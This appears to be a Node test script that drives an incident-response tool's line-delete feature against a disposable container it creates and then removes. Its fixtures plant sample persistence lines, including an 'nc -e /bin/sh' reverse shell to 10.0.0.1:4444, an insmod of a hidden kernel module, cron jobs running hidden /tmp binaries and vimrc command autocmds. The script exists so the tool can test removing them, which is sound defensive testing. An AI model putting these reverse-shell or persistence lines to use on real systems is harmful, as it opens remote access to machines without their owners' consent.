// Backend RPC probe for the delete-lines path action.
// Only runs against a UUID-labelled disposable container it creates itself.
//
// What has to hold on a real target:
//   * a workbench line that names a managed startup/cron file offers
//     "删除指定行…" (lineEditable); the preview binds the exact bytes the
//     operator looked at;
//   * the plan names the file, the line range and that the whole file is
//     backed up first — execute re-reads the file (digest) before writing,
//     so a file changed mid-flight is refused untouched;
//   * verification is an independent re-read (sha256 of the remaining bytes),
//     and one undo puts the saved bytes back — only while the file has not
//     moved on;
//   * /etc/init.d and rc.local get a `sh -n` check before and after: a delete
//     that breaks the script is put back automatically, while an already
//     broken script is edited with an explicit "未做语法检查" note;
//   * outside-allow-list paths, symlinks and out-of-range selections are
//     refused with their own codes.
import { execFileSync, spawn } from "node:child_process";
import { createHash, randomUUID } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import net from "node:net";
import { Sidecar, connect, backendBinary } from "./rpc-harness.mjs";

const repository = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const runId = randomUUID(), name = `lr-lines-${runId.slice(0, 8)}`;
const evidence = path.join(repository, "target/desktop-debug", `line-delete-${runId}`);
const dataRoot = fs.mkdtempSync(path.join(os.tmpdir(), "lovelyhawk-lines-"));
const checks = [], observations = {};
let containerId, imageId, sidecar, failure, forwarder;
fs.mkdirSync(evidence, { recursive: true });

const podman = (...args) => execFileSync("podman.exe", args, { encoding: "utf8", windowsHide: true, timeout: 300_000, maxBuffer: 4 * 1024 * 1024 }).trim();
function check(label, actual) { checks.push({ label, passed: Boolean(actual) }); console.log(`${actual ? "PASS" : "FAIL"} ${label}`); if (!actual) throw new Error(label); }
function owned() {
  const target = JSON.parse(podman("inspect", containerId))[0];
  const strip = v => String(v ?? "").replace(/^sha256:/u, "");
  if (target.Id !== containerId || strip(target.Image) !== strip(imageId) || (target.Name !== `/${name}` && target.Name !== name) ||
    target.Config.Labels?.["lovelyres-test-run"] !== runId || target.HostConfig.Privileged || (target.Mounts ?? []).some(m => m.Type === "bind"))
    throw new Error("Owned line-delete fixture identity changed");
  return target;
}
const onHost = (...args) => { owned(); return podman("exec", containerId, ...args); };
const file = target => onHost("cat", target);
const raw = target => Buffer.from(onHost("base64", target), "base64").toString("utf8");
const sha = target => onHost("sha256sum", target).split(/\s+/u)[0];
// `cat` over execFileSync loses the trailing newline, so the readable compare
// is on trimmed text and the byte-exact claim is the sha256 of the file.
const same = (target, expected) =>
  file(target) === expected.trim() &&
  sha(target) === createHash("sha256").update(expected, "utf8").digest("hex");
const write = (target, content) => onHost("sh", "-c", `echo ${Buffer.from(content, "utf8").toString("base64")} | base64 -d > ${target}`);
const append = (target, content) => onHost("sh", "-c", `echo ${Buffer.from(content, "utf8").toString("base64")} | base64 -d >> ${target}`);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// Fixture contents are known bytes, so the probe computes the expected
// post-delete file itself instead of trusting any receipt.
const SSH_FIXTURE = "#!/bin/sh\ncase \"$1\" in\n  start)\n    /bin/true\n    ;;\nesac\n" +
  "# lh-inject-start\nnc -e /bin/sh 10.0.0.1 4444\n/tmp/.helper -q\ninsmod /root/.x.ko\ntouch /tmp/.lhmark\n# lh-inject-end\nexit 0\n";
const SSH_AFTER = "#!/bin/sh\ncase \"$1\" in\n  start)\n    /bin/true\n    ;;\nesac\nexit 0\n";
const FI_FIXTURE = "#!/bin/sh\nif [ \"$1\" = \"start\" ]; then\n  nc -e /bin/sh 10.0.0.1 4444\nfi\nexit 0\n";
const BROKEN_FIXTURE = "#!/bin/sh\nif [ \"$1\" = \"start\" ]; then\n  nc -e /bin/sh 10.0.0.1 4444\nexit 0\n";
const BROKEN_AFTER = "#!/bin/sh\nif [ \"$1\" = \"start\" ]; then\n  nc -e /bin/sh 10.0.0.1 4444\n";
const PERMS_CRON = "# lh probe\n* * * * * root /tmp/.lhp1\n";
const PERMS_AFTER = "# lh probe\n";
const SPOOL = "# lh probe\n* * * * * /tmp/.lhp4\n";
const SPOOL_AFTER = "# lh probe\n";
const STALE_CRON = "# lh probe\n* * * * * root /tmp/.lhp2\n";
const RACE_CRON = "# lh probe\n* * * * * root /tmp/.lhp3\n";
const HIDDEN_CRON = "# should never be edited\n";
const VIMRC = "\" lh probe\nset modeline\nautocmd BufRead * :!id\nset number\n";
const VIMRC_AFTER = "\" lh probe\nautocmd BufRead * :!id\nset number\n";
// One cron line references every fixture the chain collector should offer:
// `链：/etc/crontab → <ref>` lines are how init.d and profile handles appear.
const REF_LINE = "* * * * * root /bin/sh /etc/init.d/ssh-fixture /etc/init.d/fi-fixture /etc/init.d/broken-fixture /etc/init.d/badlink /etc/profile\n";
const BEACON_LINE = "* * * * * root /tmp/.lhbeacon\n";

try {
  imageId = podman("image", "inspect", "lovelyres-svc:postgres", "--format", "{{.Id}}");
  containerId = podman("run", "-d", "--name", name, "--label", `lovelyres-test-run=${runId}`, "--memory", "512m", "--cpus", "1", "--pids-limit", "128",
    "-e", "POSTGRES_PASSWORD=LabDb#2026", "-e", "LAB_SERVICE_COMMAND=sleep 3600", imageId);
  check("line-delete fixture is an owned, unprivileged container without host mounts", Boolean(owned()));
  onHost("sh", "-c", "command -v sha256sum stat base64 sh");

  // The postgres image has no cron package, so no /etc/crontab either.
  onHost("sh", "-c", "test -f /etc/crontab || { printf '# probe crontab\\nSHELL=/bin/sh\\nPATH=/usr/bin:/bin\\n' > /etc/crontab; }");
  const crontabBefore = raw("/etc/crontab");
  const profileBefore = raw("/etc/profile");
  write("/etc/init.d/ssh-fixture", SSH_FIXTURE);
  write("/etc/init.d/fi-fixture", FI_FIXTURE);
  write("/etc/init.d/broken-fixture", BROKEN_FIXTURE);
  onHost("ln", "-s", "/etc/init.d/fi-fixture", "/etc/init.d/badlink");
  onHost("sh", "-c", "mkdir -p /etc/cron.d /etc/init.d /var/spool/cron/crontabs");
  write("/etc/cron.d/lh-perms", PERMS_CRON);
  onHost("chmod", "0640", "/etc/cron.d/lh-perms");
  onHost("chown", "nobody:nogroup", "/etc/cron.d/lh-perms");
  write("/etc/cron.d/lh-stale", STALE_CRON);
  write("/etc/cron.d/lh-race", RACE_CRON);
  write("/etc/cron.d/.hidden", HIDDEN_CRON);
  write("/var/spool/cron/crontabs/lhprobe", SPOOL);
  onHost("sh", "-c", "mkdir -p /root/.vim/plugin");
  write("/root/.vimrc", VIMRC);
  write("/root/.vim/plugin/x.vim", "call system(\"id\")\n");
  append("/etc/crontab", REF_LINE + BEACON_LINE);
  append("/etc/profile", "insmod /root/.x.ko\n");
  const crontabPlanted = raw("/etc/crontab");
  const crontabPlantedSha = sha("/etc/crontab");
  check("fixtures planted and read back",
    onHost("sh", "-c", "sh -n /etc/init.d/ssh-fixture && sh -n /etc/init.d/fi-fixture && ! sh -n /etc/init.d/broken-fixture && echo ok") === "ok");

  const forwardTarget = owned().NetworkSettings.IPAddress + ":22";
  const machine = JSON.parse(execFileSync("podman.exe", ["machine", "inspect"], { encoding: "utf8", windowsHide: true }))[0];
  const findKey = (node, key) => {
    if (!node || typeof node !== "object") return undefined;
    if (node[key] !== undefined) return node[key];
    for (const value of Object.values(node)) { const found = findKey(value, key); if (found !== undefined) return found; }
    return undefined;
  };
  const localPort = await new Promise(resolve => {
    const server = net.createServer().listen(0, "127.0.0.1", () => { const port = server.address().port; server.close(() => resolve(port)); });
  });
  forwarder = spawn("ssh", ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=NUL", "-i", findKey(machine, "IdentityPath"), "-p", String(findKey(machine, "Port")), "-N",
    "-L", `127.0.0.1:${localPort}:${forwardTarget}`, "root@127.0.0.1"], { windowsHide: true, stdio: "ignore" });
  await sleep(1500);
  if (forwarder.exitCode !== null) throw new Error("podman machine SSH port forward failed");
  sidecar = new Sidecar(path.resolve(repository, backendBinary()), dataRoot);
  const status = await connect(sidecar, { host: "127.0.0.1", port: localPort, username: "root", password: "LabRoot#2026", id: runId, name: `${name}-22` });
  check("SSH binding connected", status?.stage === "connected");
  const binding = status.bindingHandle;

  const catalog = await sidecar.call("emergency-command.catalog.load", { bindingHandle: binding }, 180_000);
  const runCommand = async title => {
    const entry = catalog.commands.find(item => item.title === title);
    check(`catalog carries ${title}`, Boolean(entry?.commandHandle));
    return sidecar.call("emergency-command.run", {
      bindingHandle: binding, snapshotHandle: catalog.snapshotHandle, commandHandle: entry.commandHandle,
    }, 300_000);
  };
  const keyFiles = await runCommand("关键文件权限");
  const cronList = await runCommand("计划任务");
  const chain = await runCommand("持久化引用链");
  const editorConfig = await runCommand("编辑器配置持久化");
  const offer = (run, target) => {
    const found = run.paths.find(item => item.path === target);
    check(`workbench offered ${target}`, Boolean(found?.pathHandle));
    return found;
  };
  const crontabH = offer(keyFiles, "/etc/crontab");
  const passwdH = offer(keyFiles, "/etc/passwd");
  const permsH = offer(cronList, "/etc/cron.d/lh-perms");
  const staleH = offer(cronList, "/etc/cron.d/lh-stale");
  const raceH = offer(cronList, "/etc/cron.d/lh-race");
  const hiddenH = offer(cronList, "/etc/cron.d/.hidden");
  const spoolH = offer(cronList, "/var/spool/cron/crontabs/lhprobe");
  const sshH = offer(chain, "/etc/init.d/ssh-fixture");
  const fiH = offer(chain, "/etc/init.d/fi-fixture");
  const brokenH = offer(chain, "/etc/init.d/broken-fixture");
  const badlinkH = offer(chain, "/etc/init.d/badlink");
  const profileH = offer(chain, "/etc/profile");
  const vimrcH = offer(editorConfig, "/root/.vimrc");
  check("managed fixtures are lineEditable, unmanaged ones are not",
    [crontabH, permsH, spoolH, sshH, profileH, vimrcH].every(item => item.lineEditable === true) &&
    passwdH.lineEditable === false && hiddenH.lineEditable === false && badlinkH.lineEditable === true);

  const preview = pathHandle => sidecar.call("emergency-command.path.lines",
    { bindingHandle: binding, pathHandle }, 180_000);
  const planLines = (previewHandle, firstLine, lastLine) => sidecar.call("emergency-command.path.plan-lines",
    { bindingHandle: binding, previewHandle, firstLine, lastLine }, 180_000);
  const confirm = planHandle => sidecar.call("emergency-command.path.confirm",
    { bindingHandle: binding, planHandle }, 180_000);
  const execute = planHandle => sidecar.call("emergency-command.path.execute",
    { bindingHandle: binding, planHandle }, 300_000);
  const undo = planHandle => sidecar.call("emergency-command.path.undo",
    { bindingHandle: binding, planHandle }, 300_000);
  const refusePreview = handle => preview(handle.pathHandle)
    .then(() => "previewed").catch(error => String(error.message));
  const lineOf = (view, needle) => {
    const hit = view.lines.find(item => item.text.includes(needle));
    check(`preview of ${view.path} shows ${needle}`, Boolean(hit));
    return hit.number;
  };

  // ---- delete-lines is not a generic or batch action ---------------------
  const generic = await sidecar.call("emergency-command.path.plan",
    { bindingHandle: binding, pathHandle: crontabH.pathHandle, action: "delete-lines" }, 180_000)
    .then(() => "planned").catch(error => String(error.message));
  check("the generic plan entry refuses delete-lines", /emergency-path-batch-action/u.test(generic));
  const batched = await sidecar.call("emergency-command.path.batch.plan",
    { bindingHandle: binding, pathHandles: [crontabH.pathHandle], action: "delete-lines" }, 180_000)
    .then(() => "planned").catch(error => String(error.message));
  check("the batch plan entry refuses delete-lines", /emergency-path-batch-action/u.test(batched));

  // ---- /etc/crontab: single line, byte-exact, undo -----------------------
  const cronView = await preview(crontabH.pathHandle);
  check("crontab preview is complete and numbered",
    cronView.totalLines > 0 && cronView.truncated === false && cronView.lines.length === cronView.totalLines);
  const beaconLine = lineOf(cronView, "lhbeacon");
  const cronPlan = await planLines(cronView.previewHandle, beaconLine, beaconLine);
  console.log(`  plan: ${cronPlan.summary}`);
  check("plan names the file and the single line, and says it deletes",
    cronPlan.summary.includes("/etc/crontab") && /删除/u.test(cronPlan.summary));
  check("plan lists exactly the beacon line",
    cronPlan.removedLines.length === 1 && cronPlan.removedLines[0].text.includes("lhbeacon"));
  check("plan is dangerous and names its restore", cronPlan.dangerous === true && String(cronPlan.restoreDescription ?? "").length > 4);
  await confirm(cronPlan.planHandle);
  const cronReceipt = await execute(cronPlan.planHandle);
  console.log(`  receipt: passed=${cronReceipt.passed} ${String(cronReceipt.detail).slice(0, 80)}`);
  check("crontab delete verified", cronReceipt.passed === true && cronReceipt.undoable === true);
  check("independent readback: the file is the planted content minus the beacon line",
    same("/etc/crontab", crontabPlanted.replace(BEACON_LINE, "")));
  const again = await execute(cronPlan.planHandle).then(() => "ran twice").catch(error => String(error.message));
  check("a spent plan cannot run again", again !== "ran twice" && /plan-unavailable/u.test(again));
  const cronUndo = await undo(cronPlan.planHandle);
  console.log(`  undo: undone=${cronUndo.undone} ${String(cronUndo.detail).slice(0, 80)}`);
  check("undo verified", cronUndo.undone === true);
  check("independent readback: the beacon line is back byte for byte", sha("/etc/crontab") === crontabPlantedSha);

  // ---- /etc/init.d/ssh-fixture: 6-line block, syntax checked -------------
  const sshView = await preview(sshH.pathHandle);
  const blockStart = lineOf(sshView, "lh-inject-start");
  const blockEnd = lineOf(sshView, "lh-inject-end");
  const sshPlan = await planLines(sshView.previewHandle, blockStart, blockEnd);
  check("the plan carries all six injected lines",
    sshPlan.removedLines.length === 6 && sshPlan.removedLines.some(item => item.text.includes("nc -e")));
  await confirm(sshPlan.planHandle);
  const sshReceipt = await execute(sshPlan.planHandle);
  console.log(`  receipt: passed=${sshReceipt.passed} ${String(sshReceipt.detail).slice(0, 90)}`);
  check("init.d block delete verified and syntax-checked",
    sshReceipt.passed === true && /语法检查/u.test(String(sshReceipt.detail)));
  check("independent readback: exactly the injected block is gone",
    same("/etc/init.d/ssh-fixture", SSH_AFTER) && onHost("sh", "-n", "/etc/init.d/ssh-fixture") === "");

  // ---- /etc/profile: delete, then undo is refused after another change ---
  const profileView = await preview(profileH.pathHandle);
  const insmodLine = lineOf(profileView, "insmod /root/.x.ko");
  const profilePlan = await planLines(profileView.previewHandle, insmodLine, insmodLine);
  await confirm(profilePlan.planHandle);
  const profileReceipt = await execute(profilePlan.planHandle);
  check("profile delete verified", profileReceipt.passed === true);
  check("independent readback: insmod line gone, rest byte-identical",
    same("/etc/profile", profileBefore));
  append("/etc/profile", "# something else changed\n");
  const refusedUndo = await undo(profilePlan.planHandle);
  console.log(`  undo after change: undone=${refusedUndo.undone} ${String(refusedUndo.detail).slice(0, 80)}`);
  check("undo is refused when the file moved on", refusedUndo.undone === false);
  check("the later change was left in place",
    same("/etc/profile", `${profileBefore}# something else changed\n`));

  // ---- /etc/cron.d/lh-perms: mode and owner survive ----------------------
  const permsView = await preview(permsH.pathHandle);
  const permsLine = lineOf(permsView, "lhp1");
  const permsPlan = await planLines(permsView.previewHandle, permsLine, permsLine);
  await confirm(permsPlan.planHandle);
  const permsReceipt = await execute(permsPlan.planHandle);
  check("perms-file delete verified", permsReceipt.passed === true);
  check("mode and owner unchanged on a non-root-owned 0640 file",
    onHost("stat", "-c", "%a %U:%G", "/etc/cron.d/lh-perms") === "640 nobody:nogroup");
  check("independent readback: only the job line went", same("/etc/cron.d/lh-perms", PERMS_AFTER));

  // ---- cron spool --------------------------------------------------------
  const spoolView = await preview(spoolH.pathHandle);
  const spoolLine = lineOf(spoolView, "lhp4");
  const spoolPlan = await planLines(spoolView.previewHandle, spoolLine, spoolLine);
  await confirm(spoolPlan.planHandle);
  const spoolReceipt = await execute(spoolPlan.planHandle);
  check("user spool delete verified", spoolReceipt.passed === true);
  check("independent readback: spool keeps only the comment",
    same("/var/spool/cron/crontabs/lhprobe", SPOOL_AFTER));

  // ---- a file changed between preview and plan is refused ----------------
  const staleView = await preview(staleH.pathHandle);
  append("/etc/cron.d/lh-stale", "# drift\n");
  const stalePlan = await planLines(staleView.previewHandle, 2, 2)
    .then(() => "planned").catch(error => String(error.message));
  check("a file changed after previewing is refused by code",
    /emergency-path-line-stale/u.test(stalePlan));
  check("the file kept only the outside change", same("/etc/cron.d/lh-stale", `${STALE_CRON}# drift\n`));

  // ---- a file changed between plan and execute is refused untouched ------
  const raceView = await preview(raceH.pathHandle);
  const raceLine = lineOf(raceView, "lhp3");
  const racePlan = await planLines(raceView.previewHandle, raceLine, raceLine);
  await confirm(racePlan.planHandle);
  append("/etc/cron.d/lh-race", "# drift\n");
  const raceReceipt = await execute(racePlan.planHandle);
  console.log(`  race: passed=${raceReceipt.passed} untouched=${raceReceipt.untouched}`);
  check("a file changed after planning is refused untouched",
    raceReceipt.passed === false && raceReceipt.untouched === true && raceReceipt.undoable === false);
  check("the outside change was left in place", same("/etc/cron.d/lh-race", `${RACE_CRON}# drift\n`));

  // ---- init.d syntax gate ------------------------------------------------
  const fiView = await preview(fiH.pathHandle);
  const fiLine = fiView.lines.find(item => item.text.trim() === "fi")?.number;
  check("preview shows the fi line", Boolean(fiLine));
  const fiPlan = await planLines(fiView.previewHandle, fiLine, fiLine);
  await confirm(fiPlan.planHandle);
  const fiReceipt = await execute(fiPlan.planHandle);
  console.log(`  fi: passed=${fiReceipt.passed} restored=${fiReceipt.restored} ${String(fiReceipt.detail).slice(0, 80)}`);
  check("deleting fi fails the syntax check and puts the file back",
    fiReceipt.passed === false && fiReceipt.restored === true && /语法检查/u.test(String(fiReceipt.detail)));
  check("independent readback: the script is byte-identical again",
    same("/etc/init.d/fi-fixture", FI_FIXTURE) && onHost("sh", "-n", "/etc/init.d/fi-fixture") === "");

  const brokenView = await preview(brokenH.pathHandle);
  const exitLine = lineOf(brokenView, "exit 0");
  const brokenPlan = await planLines(brokenView.previewHandle, exitLine, exitLine);
  check("an already-broken script plans with an explicit unchecked note",
    /未做语法检查/u.test(brokenPlan.summary));
  await confirm(brokenPlan.planHandle);
  const brokenReceipt = await execute(brokenPlan.planHandle);
  check("the already-broken script still deletes, flagged unchecked",
    brokenReceipt.passed === true && /未做语法检查/u.test(String(brokenReceipt.detail)));
  check("independent readback: the line is gone from the broken script",
    same("/etc/init.d/broken-fixture", BROKEN_AFTER));

  // ---- /root/.vimrc: the editor entry offers the line-delete flow --------
  const vimView = await preview(vimrcH.pathHandle);
  const modelineLine = lineOf(vimView, "set modeline");
  const vimPlan = await planLines(vimView.previewHandle, modelineLine, modelineLine);
  check("vimrc plan names the file and the single line",
    vimPlan.summary.includes("/root/.vimrc") && vimPlan.removedLines.length === 1);
  await confirm(vimPlan.planHandle);
  const vimReceipt = await execute(vimPlan.planHandle);
  check("editor-config line delete verified", vimReceipt.passed === true);
  check("independent readback: only the modeline line went",
    same("/root/.vimrc", VIMRC_AFTER));

  // ---- refusals ----------------------------------------------------------
  check("a symlink is refused by kind", /emergency-path-line-kind/u.test(await refusePreview(badlinkH)));
  check("an outside-allow-list file is refused by location", /emergency-path-line-location/u.test(await refusePreview(passwdH)));
  check("a dot file in cron.d is refused by location", /emergency-path-line-location/u.test(await refusePreview(hiddenH)));
  const rangeView = await preview(crontabH.pathHandle);
  const outOfRange = await planLines(rangeView.previewHandle, 999_999, 999_999)
    .then(() => "planned").catch(error => String(error.message));
  check("a range outside the file is refused by range", /emergency-path-line-range/u.test(outOfRange));
  check("the whole-file backup landed beside the file",
    onHost("sh", "-c", "find /etc/cron.d/.lovelyres-backups /etc/.lovelyres-backups -type f 2>/dev/null | head -1").length > 0);
  observations.sha = { crontabPlanted: crontabPlantedSha, sshAfter: sha("/etc/init.d/ssh-fixture") };
  observations.note = "directory refusal shares the same not-a-regular-file check as the symlink case (path.lines lstat → line-kind); covered by unit tests, no workbench command offers a directory handle";
} catch (error) {
  failure = String(error?.stack ?? error);
  console.log(`FAILURE ${failure.split("\n")[0]}`);
} finally {
  if (sidecar) { try { sidecar.close(); } catch {} }
  if (forwarder) forwarder.kill();
  if (containerId) {
    try { owned(); podman("rm", "-f", containerId); checks.push({ label: "owned line-delete fixture removed", passed: true }); }
    catch (error) { failure ??= String(error); process.exitCode = 1; }
  }
  const sourceHashes = {};
  for (const file of ["crates/lovelyhawk-core/src/line_delete.rs", "crates/lovelyhawk-backend/src/emergency_path_api.rs"])
    sourceHashes[file] = createHash("sha256").update(fs.readFileSync(path.join(repository, file))).digest("hex").slice(0, 16);
  fs.writeFileSync(path.join(evidence, "report.json"), JSON.stringify({
    runId, date: new Date().toISOString(), imageId, sourceHashes, observations,
    checks, error: failure ?? null,
    limits: ["backend RPC driven, no renderer", "Debian container root; sudo -n path not driven", "directory refusal not reachable via workbench handles"],
  }, null, 2));
  console.log(`Evidence: ${path.join(evidence, "report.json")}`);
  const failed = checks.filter(item => !item.passed);
  console.log(`${checks.length - failed.length}/${checks.length} checks passed`);
  if (failed.length > 0 || failure) process.exitCode = 1;
}
